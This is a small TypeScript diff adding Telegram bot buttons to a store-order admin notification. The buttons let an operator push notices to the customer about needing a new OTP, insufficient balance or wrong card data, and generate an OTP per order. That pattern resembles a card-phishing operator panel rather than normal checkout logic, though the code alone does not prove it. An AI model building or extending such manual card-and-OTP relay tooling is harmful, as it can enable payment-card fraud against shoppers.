@@ -97,12 +97,17 @@ async function notifyAdminAboutNewOrder(db: Db, order: StoreOrder) {
   ].join('\n');
 
   try {
+    const orderId = order._id.toHexString();
     await sendTelegramMessage(adminId, message, {
       reply_markup: {
-        inline_keyboard: [[{
-          text: 'فتح الطلب ومراجعته',
-          callback_data: 'edit-order:' + order._id.toHexString()
-        }]]
+        inline_keyboard: [
+          [{ text: '1️⃣ إظهار الفاتورة للعميل', callback_data: 'send-order-documents:' + orderId }],
+          [{ text: '❌ طلب رمز OTP جديد', callback_data: 'order-notice:' + orderId + ':otp' }],
+          [{ text: 'لا يوجد رصيد كافٍ', callback_data: 'order-notice:' + orderId + ':balance' }],
+          [{ text: 'بيانات البطاقة خاطئة', callback_data: 'order-notice:' + orderId + ':card' }],
+          [{ text: '🔐 إنشاء OTP للطلب', callback_data: 'create-order-otp:' + orderId }],
+          [{ text: 'فتح الطلب ومراجعته', callback_data: 'edit-order:' + orderId }]
+        ]
       }
     });
     await collection.updateOne(
